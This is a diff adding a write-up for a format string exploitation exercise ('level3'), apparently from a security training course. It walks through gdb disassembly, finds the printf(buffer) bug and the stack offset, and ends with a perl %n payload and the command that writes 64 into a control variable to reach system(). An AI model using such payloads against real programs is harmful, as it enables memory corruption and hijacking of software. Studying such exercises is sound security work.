@@ -1,0 +1,56 @@
+By looking at the asm code with gdb, we can see that the program uses fgets and system.
+Looking on google about fgets tells us we can't do a buffer overflow on this one !
+
+We searched a while and we decided to write the C code before solving the level for the first time.
+
+(see source.c)
+
+The most important part is the aroud the printf call :
+
+    gdb> disas v
+    ...
+    0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
+    0x080484cc <+40>:	lea    eax,[ebp-0x208]
+    0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
+    0x080484d5 <+49>:	call   0x8048390 <printf@plt>
+    ...
+
+Buffer address is directly given to printf as first argument, which give corresponding C code :
+
+    printf(buffer);
+
+That's not secure at all ! We can use printf to read and write anywhere in the program's memory using %n.
+
+Knowing where and what to write :
+
+    A `cmp` occurs against a variable labeled as `m` by gdb. This variable is set to 0.
+    If this variable is equal to 64, the program calls system.
+
+    -> So we need to write integer 64 at memory address 0x0804988c
+
+Spying the stack (NSA level..) :
+
+    We will use our buffer as argument for printf to give it the address of `m` and write on it.
+    We'll us %n to write 64 at the adress.
+
+    First we find how many aguments we need to skip before accessing our buffer :
+
+        echo "BBBB.%#08x.%#08x.%#08x.%#08x" | ./level3
+        BBBB.0x000200.0xb7fd1ac0.0xb7ff37d0.0x42424242
+                                            ----------
+    Our buffer begins at fourth argument (technically the truth)
+
+The payload :
+
+    So we know everyhing now, the payload will look like that :
+
+    [address of m (4 bytes)][3 time '%10x' (30 bytes)][30 random bytes]['%n']
+
+    The total string written by printf will be 64 bytes long, exactly what we need to write into `m`.
+    %n will take care of writing 64 into `m`
+
+Commandline :
+
+perl -e 'print "\x8c\x98\x04\x08". "%10x"x3 . "A"x30 . "%n"' > /tmp/payload
+cat /tmp/payload - | ./level3
+
